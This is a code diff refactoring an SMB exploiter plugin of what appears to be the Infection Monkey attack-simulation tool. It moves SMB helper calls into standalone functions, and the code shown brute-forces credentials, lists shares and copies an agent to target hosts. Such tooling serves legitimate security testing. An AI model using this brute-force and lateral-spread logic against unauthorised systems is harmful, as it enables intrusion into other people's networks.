+++ monkey/agent_plugins/exploiters/smb/src/smb_exploit_client.py
@@ -14,8 +14,14 @@ from infection_monkey.exploit.tools import generate_brute_force_credentials
 from infection_monkey.exploit.tools.helpers import get_agent_dst_path
 from infection_monkey.i_puppet import TargetHost
 
-from .smb import SMB
 from .smb_options import SMBOptions
+from .smb_utils import (
+    create_smb_connection,
+    logout_guest,
+    query_server_info,
+    query_shared_resources,
+    smb_login,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -52,17 +58,17 @@ class SMBExploitClient:
         credentials_list = generate_brute_force_credentials(self._credentials)
         for credentials in credentials_list:
             # TODO: Test if we only need to create the connection once
-            self._smb = SMB.create_connection(host)
+            self._smb = create_smb_connection(host)
             if not self._smb:
                 continue
 
-            self._smb = SMB.login(self._smb, credentials)
+            self._smb = smb_login(self._smb, credentials)
             if not self._smb:
                 continue
 
             self._smb.setTimeout(options.smb_connect_timeout)
 
-            if SMB.logout_guest(self._smb):
+            if logout_guest(self._smb):
                 continue
 
             # At this point, we've successfully logged in with a non-guest user
@@ -79,7 +85,7 @@ class SMBExploitClient:
         credentials: Credentials,
     ) -> Optional[str]:
         """File path if the agent was copied successfully, otherwise None"""
-        if not SMB.query_server_info(self._smb):
+        if not query_server_info(self._smb):
             return None
 
         shares = self.query_shares(host, path)
@@ -93,7 +99,7 @@ class SMBExploitClient:
         return None
 
     def query_shares(self, host: TargetHost, path: PurePath):
-        resp = SMB.query_shared_resources(self._smb)
+        resp = query_shared_resources(self._smb)
         if not resp:
             return ()
 
@@ -154,11 +160,11 @@ class SMBExploitClient:
             yield remote_path, share_name, share_path
 
     def connect_with_user(self, host: TargetHost, credentials: Credentials) -> bool:
-        self._smb = SMB.create_connection(host)
+        self._smb = create_smb_connection(host)
         if not self._smb:
             return False
 
-        self._smb = SMB.login(self._smb, credentials)
+        self._smb = smb_login(self._smb, credentials)
         if not self._smb:
             return False
